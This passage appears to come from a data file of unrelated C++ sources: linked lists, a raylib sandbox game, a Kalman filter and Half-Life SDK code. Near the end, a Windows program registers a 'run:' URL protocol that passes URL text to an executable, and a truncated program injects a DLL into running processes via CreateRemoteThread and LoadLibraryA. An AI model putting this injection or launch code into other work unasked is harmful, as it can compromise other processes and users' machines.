Temp->pPrev<< tab\n\t\t\t<< Temp << tab\n\t\t\t<< Temp->Data << tab\n\t\t\t<< Temp->pNext<< endl;\n\n\t\tcout << \"Head:\\t\" << Head << endl;\n\t\tcout << \"\u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00ee\u00e2 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0:\" << size << endl;\n\t\tcout << delimiter << endl;\n\t}\n};\n\nvoid main()\n{\n\tsetlocale(LC_ALL, \"\");\n\tint n;\n\tcout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00e2\u00ee \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00ee\u00e2:\"; cin >> n;\n\tList list;\n\tfor (int i = 0 ;i < n; i++)\n\t{\n\t\t//list.push_front(rand() % 100);\n\t\tlist.push_back(rand() % 100);\n\t}\n\tlist.print();\n\tlist.revers_print();\n\tfor (int i = 0; i < 100; i++) list.pop_back();\n}",
    "#include \"handler.h\"\n#include \"colormanager.h\"\n#include \"elementEnum.h\"\n#include <string>\n#include <vector>\n\n\n\nHandle::Handle(int width, int height, int cellsize) :\n\tm_grid(width, height, cellsize), m_type(sand), m_scale(2), m_shape(1)\n{}\n\nvoid Handle::Draw()\n{\n\tm_grid.Draw();\n}\n\nvoid Handle::Update()\n{\n\tm_grid.Update(m_type);\n}\n\nvoid Handle::InputMouse(int type)\n{\n\tVector2 mousePosition = GetMousePosition();\n\n\tif (IsMouseButtonDown(MOUSE_LEFT_BUTTON))\n\t{\n\t\tm_grid.addBlock((int)mousePosition.x, (int)mousePosition.y, type, m_scale, m_shape);\n\t}\n\telse if (IsMouseButtonDown(MOUSE_RIGHT_BUTTON))\n\t{\n\t\tm_grid.erase((int)mousePosition.x, (int)mousePosition.y);\n\t}\n}\n\nvoid Handle::inputChoice()\n{\n\tif (IsKeyPressed(KEY_S))\n\t{\n\t\tm_scale *= 2;\n\t\tif (m_scale > 17)\n\t\t\tm_scale = 1;\n\t}\n\n\tInputMouse(m_type);\n}\n\nvoid Handle::UIPanel(int width, int height, Color color)\n{\n\tDrawRectangle(width, 0, GetScreenWidth(), height, color);\n\tDrawText(\"Sandbox-2D\", width + 20, 10, 30, WHITE);\n\n\tconst char* element = getElementName(m_type);\n\tColor elementColor = ColorManager::getElementColor(m_type);\n\n\tDrawText(\"Element:\", width + 20, 60, 20, WHITE);\n\tDrawText(element, width + 110, 60, 20, elementColor);\n\tDrawText(\"Scale:\", width + 50, 90, 20, WHITE);\n\n\tstd::string scaleString = std::to_string(m_scale);\n\tDrawText(scaleString.c_str(), width + 120, 90, 20, WHITE);\n\n\tDrawText(\"Reset\", width + 50, 120, 20, WHITE);\n\n\tconst char* shape = (m_shape == 1) ? \"Square\" : \"Circle\";\n\tDrawText(\"Shape:\", width + 50, 150, 20, WHITE);\n\tDrawText(shape, width + 120, 150, 19, RAYWHITE);\n}\n\nvoid Handle::UIButton(int width)\n{\n\tbool mousePressed = IsMouseButtonPressed(MOUSE_BUTTON_LEFT);\n\tVector2 mousePoint = GetMousePosition();\n\n\t// Define buttons for elements\n\tstd::vector<Rectangle> elementButtons = createElementButtons(width);\n\n\t// Define utility buttons\n\tRectangle buttonScale{ (float)width + 20, 90, 15, 15 };\n\tRectangle buttonReset{ (float)width + 20, 120, 15, 15 };\n\tRectangle buttonShape{ (float)width + 20, 150, 15, 15 };\n\n\t// Handle utility buttons\n\tif (isPressed(mousePoint, mousePressed, buttonScale))\n\t{\n\t\tm_scale *= 2;\n\t\tif (m_scale > 17)\n\t\t\tm_scale = 1;\n\t}\n\tif (isPressed(mousePoint, mousePressed, buttonReset))\n\t\tm_grid.ResetGrid();\n\n\tif (isPressed(mousePoint, mousePressed, buttonShape))\n\t{\n\t\tm_shape = (m_shape + 1) % 2;\n\t}\n\n\t// Handle element buttons\n\tfor (int i = 0; i < endType - 1; i++)\n\t{\n\t\tif (isPressed(mousePoint, mousePressed, elementButtons[i]))\n\t\t{\n\t\t\tm_type = i + 1;\n\t\t}\n\t\tDrawRectangleRec(elementButtons[i], ColorManager::getElementColor(i + 1));\n\t}\n\n\t// Draw utility buttons\n\tDrawRectangleRec(buttonScale, RAYWHITE);\n\tDrawRectangleRec(buttonReset, RAYWHITE);\n\tDrawRectangleRec(buttonShape, RAYWHITE);\n}\n\nbool Handle::isPressed(Vector2 mousePos, bool mousePress, Rectangle button)\n{\n\treturn CheckCollisionPointRec(mousePos, button) && mousePress;\n}\n\nvoid Handle::placeElement(int x, int y, int type)\n{\n\tm_grid.addBlock(x, y, type, 1, m_shape);\n}\n\n\nconst char* Handle::getElementName(int type)\n{\n\t//TODO: add here\n\tswitch (type)\n\t{\n\tcase sand: return \"Sand\";\n\tcase water: return \"Water\";\n\tcase stone: return \"Stone\";\n\tcase lava: return \"Lava\";\n\tcase smoke: return \"Smoke\";\n\tcase cement: return \"Cement\";\n\tcase acid: return \"Acid\";\n\tcase oil: return \"Oil\";\n\tcase fire: return \"Fire\";\n\tcase gunpowder: return \"Gun Powder\";\n\tcase wood: return \"Wood\";\n\tdefault: return \"init\";\n\t}\n}\n\nstd::vector<Rectangle> Handle::createElementButtons(int width)\n{\n\tstd::vector<Rectangle> buttons;\n\tint columns = 5;\n\tfloat xPos = 20, yPos = 200;\n\tfloat buttonWidth = 30;\n\tfloat buttonHeight = 30;\n\tint padding = 20;\n\n\tfor (int i = 1; i < endType; i++)\n\t{\n\t\tbuttons.push_back(Rectangle{ (float)width + xPos, yPos, buttonWidth, buttonHeight });\n\n\t\txPos += buttonWidth + padding;\n\t\tif (i % columns == 0)\n\t\t{\n\t\t\txPos = 20;\n\t\t\tyPos += buttonHeight + padding;\n\t\t}\n\t}\n\n\treturn buttons;\n}\n\n\n\n",
    "#include <iostream>\n#include \"Linked_list.h\"\nusing namespace std;\n\nclass eo_strings {\npublic:\n\tvoid add(string s);\n\tvoid del(string s);\n\tvoid del(char c, Linked_list<string> s);\n\tvoid show(Linked_list<string> s);\n\tLinked_list<string> getEvenList();\n\tLinked_list<string> getOddList();\n\nprivate:\n\tLinked_list<string> even;\n\tLinked_list<string> odd;\n\n\tbool isEven(string s);\n\tLinked_list<string>::posizione posizione(Linked_list<string>& lista, string s);\n};\n\nbool eo_strings::isEven(string s) {\n\tif(s.length()% 2 == 0)\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nLinked_list<string>::posizione eo_strings::posizione(Linked_list<string>& lista, string s){\n\tLinked_list<string>::posizione pos;\n\tpos = lista.primoLista();\n\t\twhile(!lista.fineLista(pos))\n\t\t{\n\t\t\tif(lista.leggiLista(pos) == s)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tpos = lista.succLista(pos);\n\t\t}\n\treturn pos;\n}\n\nvoid eo_strings::add(string s) {\n\tif(isEven(s)) {\n\t\teven.inserisciCoda(s);\n\t} else {\n\t\todd.inserisciCoda(s);\n\t}\n}\n\nvoid eo_strings::del(string s) {\n\tLinked_list<string>::posizione pos;\n\tif(isEven(s)) {\n\t\tpos = posizione(even, s);\n\t\teven.cancLista(pos);\n\t} else {\n\t\tpos = posizione(odd, s);\n\t\todd.cancLista(pos);\n\t}\n}\n\nvoid eo_strings::del(char c, Linked_list<string> s) {\n\tLinked_list<string>::posizione pos;\n\tpos = s.primoLista();\n\twhile(!s.fineLista(pos)) {\n\t\tconst char * str = s.leggiLista(pos).c_str();\n\t\tif(str[0] == c) {\n\t\t\ts.cancLista(pos);\n\t\t\tpos = even.primoLista();\n\t\t} else {\n\t\t\tpos = even.succLista(pos);\n\t\t}\n\t}\n}\n\nLinked_list<string> eo_strings::getEvenList(){\n\treturn even;\n}\n\nLinked_list<string> eo_strings::getOddList(){\n\treturn odd;\n}\n\nvoid eo_strings::show(Linked_list<string> s) {\n\tcout << s << endl;\n}\n\nint main() {\n\teo_strings categorizer;\n\n\tcategorizer.add(\"apple\");\n\tcategorizer.add(\"banana\");\n\tcategorizer.add(\"pear\");\n\tcategorizer.add(\"orange\");\n\tcategorizer.add(\"kiwi\");\n\tcategorizer.add(\"strawberry\");\n\n\tcout << \"Lista delle stringhe pari: \";\n\tcategorizer.show(categorizer.getEvenList());\n\n\tcategorizer.del(\"banana\");\n\tcategorizer.del(\"kiwi\");\n\n\tcout << \"Lista pari modificata: \";\n\tcategorizer.show(categorizer.getEvenList());\n\n\tcategorizer.del('s', categorizer.getEvenList());\n\n\tcout << \"Lista pari senza strawberry: \";\n\tcategorizer.show(categorizer.getEvenList());\n\n\tcout << \"Lista delle stringhe dispari: \";\n\tcategorizer.show(categorizer.getOddList());\n\t\n\tsystem(\"pause\");\n\treturn 0;\n}\n",
    "#include \"bytekalman_filter.h\"\n#include <Eigen/Cholesky>\n\nnamespace byte_kalman\n{\n\tconst double ByteKalmanFilter::chi2inv95[10] = {\n\t0,\n\t3.8415,\n\t5.9915,\n\t7.8147,\n\t9.4877,\n\t11.070,\n\t12.592,\n\t14.067,\n\t15.507,\n\t16.919\n\t};\n\tByteKalmanFilter::ByteKalmanFilter()\n\t{\n\t\tint ndim = 4;\n\t\tdouble dt = 1.;\n\n\t\t_motion_mat = Eigen::MatrixXf::Identity(8, 8);\n\t\tfor (int i = 0; i < ndim; i++) {\n\t\t\t_motion_mat(i, ndim + i) = dt;\n\t\t}\n\t\t_update_mat = Eigen::MatrixXf::Identity(4, 8);\n\n\t\tthis->_std_weight_position = 1. / 20;\n\t\tthis->_std_weight_velocity = 1. / 160;\n\t}\n\n\tKAL_DATA ByteKalmanFilter::initiate(const DETECTBOX &measurement)\n\t{\n\t\tDETECTBOX mean_pos = measurement;\n\t\tDETECTBOX mean_vel;\n\t\tfor (int i = 0; i < 4; i++) mean_vel(i) = 0;\n\n\t\tKAL_MEAN mean;\n\t\tfor (int i = 0; i < 8; i++) {\n\t\t\tif (i < 4) mean(i) = mean_pos(i);\n\t\t\telse mean(i) = mean_vel(i - 4);\n\t\t}\n\n\t\tKAL_MEAN std;\n\t\tstd(0) = 2 * _std_weight_position * measurement[3];\n\t\tstd(1) = 2 * _std_weight_position * measurement[3];\n\t\tstd(2) = 1e-2;\n\t\tstd(3) = 2 * _std_weight_position * measurement[3];\n\t\tstd(4) = 10 * _std_weight_velocity * measurement[3];\n\t\tstd(5) = 10 * _std_weight_velocity * measurement[3];\n\t\tstd(6) = 1e-5;\n\t\tstd(7) = 10 * _std_weight_velocity * measurement[3];\n\n\t\tKAL_MEAN tmp = std.array().square();\n\t\tKAL_COVA var = tmp.asDiagonal();\n\t\treturn std::make_pair(mean, var);\n\t}\n\n\tvoid ByteKalmanFilter::predict(KAL_MEAN &mean, KAL_COVA &covariance)\n\t{\n\t\t//revise the data;\n\t\tDETECTBOX std_pos;\n\t\tstd_pos << _std_weight_position * mean(3),\n\t\t\t_std_weight_position * mean(3),\n\t\t\t1e-2,\n\t\t\t_std_weight_position * mean(3);\n\t\tDETECTBOX std_vel;\n\t\tstd_vel << _std_weight_velocity * mean(3),\n\t\t\t_std_weight_velocity * mean(3),\n\t\t\t1e-5,\n\t\t\t_std_weight_velocity * mean(3);\n\t\tKAL_MEAN tmp;\n\t\ttmp.block<1, 4>(0, 0) = std_pos;\n\t\ttmp.block<1, 4>(0, 4) = std_vel;\n\t\ttmp = tmp.array().square();\n\t\tKAL_COVA motion_cov = tmp.asDiagonal();\n\t\tKAL_MEAN mean1 = this->_motion_mat * mean.transpose();\n\t\tKAL_COVA covariance1 = this->_motion_mat * covariance *(_motion_mat.transpose());\n\t\tcovariance1 += motion_cov;\n\n\t\tmean = mean1;\n\t\tcovariance = covariance1;\n\t}\n\n\tKAL_HDATA ByteKalmanFilter::project(const KAL_MEAN &mean, const KAL_COVA &covariance)\n\t{\n\t\tDETECTBOX std;\n\t\tstd << _std_weight_position * mean(3), _std_weight_position * mean(3),\n\t\t\t1e-1, _std_weight_position * mean(3);\n\t\tKAL_HMEAN mean1 = _update_mat * mean.transpose();\n\t\tKAL_HCOVA covariance1 = _update_mat * covariance * (_update_mat.transpose());\n\t\tEigen::Matrix<float, 4, 4> diag = std.asDiagonal();\n\t\tdiag = diag.array().square().matrix();\n\t\tcovariance1 += diag;\n\t\t//    covariance1.diagonal() << diag;\n\t\treturn std::make_pair(mean1, covariance1);\n\t}\n\n\tKAL_DATA\n\t\tByteKalmanFilter::update(\n\t\t\tconst KAL_MEAN &mean,\n\t\t\tconst KAL_COVA &covariance,\n\t\t\tconst DETECTBOX &measurement)\n\t{\n\t\tKAL_HDATA pa = project(mean, covariance);\n\t\tKAL_HMEAN projected_mean = pa.first;\n\t\tKAL_HCOVA projected_cov = pa.second;\n\n\t\t//chol_factor, lower =\n\t\t//scipy.linalg.cho_factor(projected_cov, lower=True, check_finite=False)\n\t\t//kalmain_gain =\n\t\t//scipy.linalg.cho_solve((cho_factor, lower),\n\t\t//np.dot(covariance, self._upadte_mat.T).T,\n\t\t//check_finite=False).T\n\t\tEigen::Matrix<float, 4, 8> B = (covariance * (_update_mat.transpose())).transpose();\n\t\tEigen::Matrix<float, 8, 4> kalman_gain = (projected_cov.llt().solve(B)).transpose(); // eg.8x4\n\t\tEigen::Matrix<float, 1, 4> innovation = measurement - projected_mean; //eg.1x4\n\t\tauto tmp = innovation * (kalman_gain.transpose());\n\t\tKAL_MEAN new_mean = (mean.array() + tmp.array()).matrix();\n\t\tKAL_COVA new_covariance = covariance - kalman_gain * projected_cov*(kalman_gain.transpose());\n\t\treturn std::make_pair(new_mean, new_covariance);\n\t}\n\n\tEigen::Matrix<float, 1, -1>\n\t\tByteKalmanFilter::gating_distance(\n\t\t\tconst KAL_MEAN &mean,\n\t\t\tconst KAL_COVA &covariance,\n\t\t\tconst std::vector<DETECTBOX> &measurements,\n\t\t\tbool only_position)\n\t{\n\t\tKAL_HDATA pa = this->project(mean, covariance);\n\t\tif (only_position) {\n\t\t\tprintf(\"not implement!\");\n\t\t\texit(0);\n\t\t}\n\t\tKAL_HMEAN mean1 = pa.first;\n\t\tKAL_HCOVA covariance1 = pa.second;\n\n\t\t//    Eigen::Matrix<float, -1, 4, Eigen::RowMajor> d(size, 4);\n\t\tDETECTBOXSS d(measurements.size(), 4);\n\t\tint pos = 0;\n\t\tfor (DETECTBOX box : measurements) {\n\t\t\td.row(pos++) = box - mean1;\n\t\t}\n\t\tEigen::Matrix<float, -1, -1, Eigen::RowMajor> factor = covariance1.llt().matrixL();\n\t\tEigen::Matrix<float, -1, -1> z = factor.triangularView<Eigen::Lower>().solve<Eigen::OnTheRight>(d).transpose();\n\t\tauto zz = ((z.array())*(z.array())).matrix();\n\t\tauto square_maha = zz.colwise().sum();\n\t\treturn square_maha;\n\t}\n}\n",
    "/***\n*\n*\tCopyright (c) 1996-2001, Valve LLC. All rights reserved.\n*\t\n*\tThis product contains software technology licensed from Id \n*\tSoftware, Inc. (\"Id Technology\").  Id Technology (c) 1996 Id Software, Inc. \n*\tAll Rights Reserved.\n*\n*   Use, distribution, and modification of this source code and/or resulting\n*   object code is restricted to non-commercial enhancements to products from\n*   Valve LLC.  All other use, distribution, or modification is prohibited\n*   without written permission from Valve LLC.\n*\n****/\n/*\n\n===== buttons.cpp ========================================================\n\n  button-related code\n\n*/\n\n#include \"extdll.h\"\n#include \"util.h\"\n#include \"cbase.h\"\n#include \"saverestore.h\"\n#include \"doors.h\"\n\n#if !defined ( _WIN32 )\n#include <string.h> // memset())))\n#endif\n\n#define SF_BUTTON_DONTMOVE\t\t1\n#define SF_ROTBUTTON_NOTSOLID\t1\n#define\tSF_BUTTON_TOGGLE\t\t32\t// button stays pushed until reactivated\n#define\tSF_BUTTON_SPARK_IF_OFF\t64\t// button sparks in OFF state\n#define SF_BUTTON_TOUCH_ONLY\t256\t// button only fires as a result of USE key.\n\n#define SF_GLOBAL_SET\t\t\t1\t// Set global state to initial state on spawn\n\nclass CEnvGlobal : public CPointEntity\n{\npublic:\n\tvoid\tSpawn( void );\n\tvoid\tKeyValue( KeyValueData *pkvd );\n\tvoid\tUse( CBaseEntity *pActivator, CBaseEntity *pCaller, USE_TYPE useType, float value );\n\n\tvirtual int\t\tSave( CSave &save );\n\tvirtual int\t\tRestore( CRestore &restore );\n\n\tstatic\tTYPEDESCRIPTION m_SaveData[];\n\t\n\tstring_t\tm_globalstate;\n\tint\t\t\tm_triggermode;\n\tint\t\t\tm_initialstate;\n};\n\nTYPEDESCRIPTION CEnvGlobal::m_SaveData[] =\n{\n\tDEFINE_FIELD( CEnvGlobal, m_globalstate, FIELD_STRING ),\n\tDEFINE_FIELD( CEnvGlobal, m_triggermode, FIELD_INTEGER ),\n\tDEFINE_FIELD( CEnvGlobal, m_initialstate, FIELD_INTEGER ),\n};\n\nIMPLEMENT_SAVERESTORE( CEnvGlobal, CBaseEntity );\n\nLINK_ENTITY_TO_CLASS( env_global, CEnvGlobal );\n\nvoid CEnvGlobal::KeyValue( KeyValueData *pkvd )\n{\n\tpkvd->fHandled = TRUE;\n\n\tif ( FStrEq(pkvd->szKeyName, \"globalstate\") )\t\t// State name\n\t\tm_globalstate = ALLOC_STRING( pkvd->szValue );\n\telse if ( FStrEq(pkvd->szKeyName, \"triggermode\") )\n\t\tm_triggermode = atoi( pkvd->szValue );\n\telse if ( FStrEq(pkvd->szKeyName, \"initialstate\") )\n\t\tm_initialstate = atoi( pkvd->szValue );\n\telse \n\t\tCPointEntity::KeyValue( pkvd );\n}\n\nvoid CEnvGlobal::Spawn( void )\n{\n\tif ( !m_globalstate )\n\t{\n\t\tREMOVE_ENTITY( ENT(pev) );\n\t\treturn;\n\t}\n\tif ( FBitSet( pev->spawnflags, SF_GLOBAL_SET ) )\n\t{\n\t\tif ( !gGlobalState.EntityInTable( m_globalstate ) )\n\t\t\tgGlobalState.EntityAdd( m_globalstate, gpGlobals->mapname, (GLOBALESTATE)m_initialstate );\n\t}\n}\n\n\nvoid CEnvGlobal::Use( CBaseEntity *pActivator, CBaseEntity *pCaller, USE_TYPE useType, float value )\n{\n\tGLOBALESTATE oldState = gGlobalState.EntityGetState( m_globalstate );\n\tGLOBALESTATE newState;\n\n\tswitch( m_triggermode )\n\t{\n\tcase 0:\n\t\tnewState = GLOBAL_OFF;\n\t\tbreak;\n\n\tcase 1:\n\t\tnewState = GLOBAL_ON;\n\t\tbreak;\n\n\tcase 2:\n\t\tnewState = GLOBAL_DEAD;\n\t\tbreak;\n\n\tdefault:\n\tcase 3:\n\t\tif ( oldState == GLOBAL_ON )\n\t\t\tnewState = GLOBAL_OFF;\n\t\telse if ( oldState == GLOBAL_OFF )\n\t\t\tnewState = GLOBAL_ON;\n\t\telse\n\t\t\tnewState = oldState;\n\t}\n\n\tif ( gGlobalState.EntityInTable( m_globalstate ) )\n\t\tgGlobalState.EntitySetState( m_globalstate, newState );\n\telse\n\t\tgGlobalState.EntityAdd( m_globalstate, gpGlobals->mapname, newState );\n}\n\n\n\nTYPEDESCRIPTION CMultiSource::m_SaveData[] =\n{\n\t//!!!BUGBUG FIX\n\tDEFINE_ARRAY( CMultiSource, m_rgEntities, FIELD_EHANDLE, MS_MAX_TARGETS ),\n\tDEFINE_ARRAY( CMultiSource, m_rgTriggered, FIELD_INTEGER, MS_MAX_TARGETS ),\n\tDEFINE_FIELD( CMultiSource, m_iTotal, FIELD_INTEGER ),\n\tDEFINE_FIELD( CMultiSource, m_globalstate, FIELD_STRING ),\n};\n\nIMPLEMENT_SAVERESTORE( CMultiSource, CBaseEntity );\n\nLINK_ENTITY_TO_CLASS( multisource, CMultiSource );\n//\n// Cache user-entity-field values until spawn is called.\n//\n\nvoid CMultiSource::KeyValue( KeyValueData *pkvd )\n{\n\tif (\tFStrEq(pkvd->szKeyName, \"style\") ||\n\t\t\t\tFStrEq(pkvd->szKeyName, \"height\") ||\n\t\t\t\tFStrEq(pkvd->szKeyName, \"killtarget\") ||\n\t\t\t\tFStrEq(pkvd->szKeyName, \"value1\") ||\n\t\t\t\tFStrEq(pkvd->szKeyName, \"value2\") ||\n\t\t\t\tFStrEq(pkvd->szKeyName, \"value3\"))\n\t\tpkvd->fHandled = TRUE;\n\telse if ( FStrEq(pkvd->szKeyName, \"globalstate\") )\n\t{\n\t\tm_globalstate = ALLOC_STRING( pkvd->szValue );\n\t\tpkvd->fHandled = TRUE;\n\t}\n\telse \n\t\tCPointEntity::KeyValue( pkvd );\n}\n\n#define SF_MULTI_INIT\t\t1\n\nvoid CMultiSource::Spawn()\n{ \n\t// set up think for later registration\n\n\tpev->solid = SOLID_NOT;\n\tpev->movetype = MOVETYPE_NONE;\n\tpev->nextthink = gpGlobals->time + 0.1;\n\tpev->spawnflags |= SF_MULTI_INIT;\t// Until it's initialized\n\tSetThink(&CMultiSource::Register);\n}\n\nvoid CMultiSource::Use( CBaseEntity *pActivator, CBaseEntity *pCaller, USE_TYPE useType, float value )\n{ \n\tint i = 0;\n\n\t// Find the entity in our list\n\twhile (i < m_iTotal)\n\t\tif ( m_rgEntities[i++] == pCaller )\n\t\t\tbreak;\n\n\t// if we didn't find it, report error and leave\n\tif (i > m_iTotal)\n\t{\n\t\tALERT(at_console, \"MultiSrc:Used by non member %s.\\n\", STRING(pCaller->pev->classname)",
    "#include <Windows.h>\n#include <ShlObj.h>\n#include <ShellAPI.h>\n\nvoid FormatLastError(const DWORD error, WCHAR* buffer, const size_t size)\n{\n     if (error == 0)\n     {\n          lstrcpyW(buffer, L\"No error\");\n          return;\n     }\n\n     FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\n                    nullptr, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buffer, static_cast <DWORD>(size),\n                    nullptr);\n}\n\nvoid ReportError(const WCHAR* message)\n{\n     WCHAR fullMessage[1024];\n     WCHAR errorText[512];\n\n     FormatLastError(GetLastError(), errorText, sizeof(errorText) / sizeof(errorText[0]));\n     wsprintfW(fullMessage, L\"%s\\nError: %s\", message, errorText);\n\n     MessageBoxW(nullptr, fullMessage, L\"Error\", MB_OK | MB_ICONERROR);\n     ExitProcess(1);\n}\n\nextern \"C\" void mainCRTStartup(void)\n{\n     WCHAR szDir[MAX_PATH]{}; // prompt (directory select)\n     BROWSEINFO bi{};\n     bi.lpszTitle = \"Select a folder to save the executable:\";\n     LPITEMIDLIST pidl = SHBrowseForFolder(&bi);\n     if (pidl != nullptr)\n     {\n          if (SHGetPathFromIDListW(pidl, szDir))\n          {\n               const size_t len = lstrlenW(szDir);\n               if (len > 0 && szDir[len - 1] == L'\\\\') szDir[len - 1] = L'\\0'; // remove trailing slashes\n          }\n          CoTaskMemFree(pidl);\n     }\n     else\n     {\n          ReportError(L\"Failed to select a directory.\");\n          ExitProcess(1);\n     }\n\n     // Copy run.exe to the selected location\n     WCHAR szDest[MAX_PATH] = {0};\n     wsprintfW(szDest, L\"%s\\\\run.exe\", szDir);\n     if (!CopyFileW(L\"run.exe\", szDest, FALSE))\n     {\n          ReportError(L\"Failed to copy the executable.\");\n          ExitProcess(1);\n     }\n\n     // -- registry part\n     HKEY hKey;\n\n     // HKCU\\run\n     LONG lRes = RegCreateKeyExW(HKEY_CLASSES_ROOT, L\"run\", 0, nullptr, REG_OPTION_NON_VOLATILE,\n                                 KEY_SET_VALUE,\n                                 nullptr, &hKey, nullptr);\n     if (lRes != ERROR_SUCCESS)\n     {\n          ReportError(L\"Failed to create registry key HKCR\\\\run\");\n          ExitProcess(1);\n     }\n\n     // HKCU\\run\\URL Protocol\n     WCHAR szURLProtocolValue[] = L\"\";\n     lRes = RegSetValueExW(hKey, L\"URL Protocol\", 0, REG_SZ, reinterpret_cast <const BYTE*>(szURLProtocolValue),\n                           sizeof(szURLProtocolValue));\n     if (lRes != ERROR_SUCCESS)\n     {\n          SetLastError(lRes);\n          ReportError(L\"Failed to set registry value HKCR\\\\run\\\\URL Protocol\");\n          ExitProcess(GetLastError());\n     }\n     RegCloseKey(hKey);\n\n     // HKCU\\run\\Shell\n     lRes = RegCreateKeyExW(HKEY_CLASSES_ROOT, L\"run\\\\Shell\", 0, nullptr, REG_OPTION_NON_VOLATILE,\n                            KEY_SET_VALUE, nullptr, &hKey, nullptr);\n     if (lRes != ERROR_SUCCESS)\n     {\n          SetLastError(lRes);\n          ReportError(LR\"(Failed to create registry key HKCR\\run\\Shell)\");\n          ExitProcess(1);\n     }\n     RegCloseKey(hKey);\n\n     // HKCU\\run\\Shell\\Open\n     lRes = RegCreateKeyExW(HKEY_CLASSES_ROOT, L\"run\\\\Shell\\\\Open\", 0, nullptr, REG_OPTION_NON_VOLATILE,\n                            KEY_SET_VALUE, nullptr, &hKey, nullptr);\n     if (lRes != ERROR_SUCCESS)\n     {\n          SetLastError(lRes);\n          ReportError(LR\"(Failed to create registry key HKCR\\run\\Shell\\Open)\");\n          ExitProcess(1);\n     }\n     RegCloseKey(hKey);\n\n     // HKCU\\run\\Shell\\Open\\command\n     lRes = RegCreateKeyExW(HKEY_CLASSES_ROOT, L\"run\\\\Shell\\\\Open\\\\command\", 0, nullptr,\n                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr);\n     if (lRes != ERROR_SUCCESS)\n     {\n          SetLastError(lRes);\n          ReportError(LR\"(Failed to create registry key HKCR\\run\\Shell\\Open\\command)\");\n          ExitProcess(1);\n     }\n\n     // Set the default value for HKCU\\run\\Shell\\Open\\command\n     WCHAR szCommand[MAX_PATH + 20]{};\n     wsprintfW(szCommand, LR\"(\"%s\" \"%%1\")\", szDest);\n     lRes = RegSetValueExW(hKey, nullptr, 0, REG_SZ, reinterpret_cast <const BYTE*>(szCommand),\n                           (lstrlenW(szCommand) + 1) * sizeof(WCHAR));\n     if (lRes != ERROR_SUCCESS)\n     {\n          SetLastError(lRes);\n          ReportError(LR\"(Failed to set registry value HKCR\\run\\Shell\\Open\\command)\");\n          ExitProcess(1);\n     }\n     RegCloseKey(hKey);\n     // -- end registry part\n\n     MessageBoxW(nullptr, L\"Successfully installed.\", L\"Success\", MB_OK);\n     ExitProcess(0);\n}\n",
    "#include <windows.h>\n#include <tlhelp32.h>\n#include <tchar.h>\n#include <string>\n#include <iostream>\n#include <chrono>\n#include <iomanip>\n\nvoid InjectDLL(DWORD pid, LPCSTR dllPath) {\n    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n    if (NULL == hProcess) {\n        return;\n    }\n    LPVOID lpAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);\n    if (lpAddr) {\n        WriteProcessMemory(hProcess, lpAddr, dllPath, strlen(dllPath) + 1, NULL);\n    }\n    else {\n        return;\n    }\n    LPTHREAD_START_ROUTINE pfnLoadLibraryA = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"LoadLibraryA\");\n    if (pfnLoadLibraryA) {\n        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnLoadLibraryA, lpAddr, 0, NULL);\n        DWORD dwExitCode = NULL;\n        if (hThread) {\n            WaitForSingleObject(hThread, INFINITE);\n            if (GetExitCodeThread(hThread, &dwExitCode))\n                CloseHandle(hThread);\n        }\n    }\n    VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);\n    CloseHandle(hProcess);\n}\nvoid WaitForEvent() {\n    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, L\"Keettoo1234\");\n    if (!hEvent) {\n        std::cerr << \"Failed to create or open event.\" << std::endl;\n        return;\n    }\n\n    while (true) {\n        WaitForSingleObject(hEvent, INFINITE);\n\n        auto now = std::chrono::system_clock::now();\n        auto now_c = std::chrono::system_clock::to_time_t(now);\n        std::tm now_tm;\n        localtime_s(&now_tm, &now_c);\n\n        std::cout << std::put_time(&now_tm, \"%Y-%m-%d %H:%M:%S\") << \" hacking detected!!\" << std::endl;\n    }\n\n    CloseHandle(hEvent);\n}\nchar* GetDllPath() {\n    char path[MAX_PATH];\n    HMODULE hModule = GetModuleHandle(NULL);\n    if (hModule != NULL) {\n        GetModuleFileNameA(hModule, path, sizeof(path));\n    }\n\n    // .exe\ub97c .dll\ub85c \ubcc0\uacbd\n    char* pos = strrchr(path, '.');\n    if (pos != NULL && strcmp(pos, \".exe\") == 0) {\n        strcpy(pos, \".dll\");\n    }\n\n    // \uacb0\uacfc\ub97c \ub3d9\uc801 \uba54\ubaa8\ub9ac\uc5d0 \ubcf5\uc0ac\n    char* dllPath = (char*)malloc(strlen(path) + 1);\n    if (dllPath != NULL) {\n        strcpy(dllPath, path);\n    }\n    return dllPath;\n}\nint main() {\n    char* dllPath = GetDllPath();\n    if (dllPath == NULL || GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {\n        printf(\"DLL not found.\\n\");\n        free(dllPath);\n        return 1;\n    }\n    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForEvent, NULL, 0, NULL);\n    if (!hThread) {\n        std::cerr << \"Failed to create event waiting thread.\" << std::endl;\n        free(dllPath);\n        return 1;\n    }\n    while (1) {\n        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n        if (hSnapshot == INVALID_HANDLE_VALUE) {\n            free(dllPath);\n\n            return 1;\n        }\n\n        PROCESSENTRY32 pe;\n        pe.dwSize = sizeof(PROCESSENTRY32);\n        if (!Process32First(hSnapshot, &pe)) {\n            CloseHandle(hSnapshot);\n            free(dllPath);\n\n            return 1;\n        }\n\n        do {\n\n            if (pe.th32ProcessID 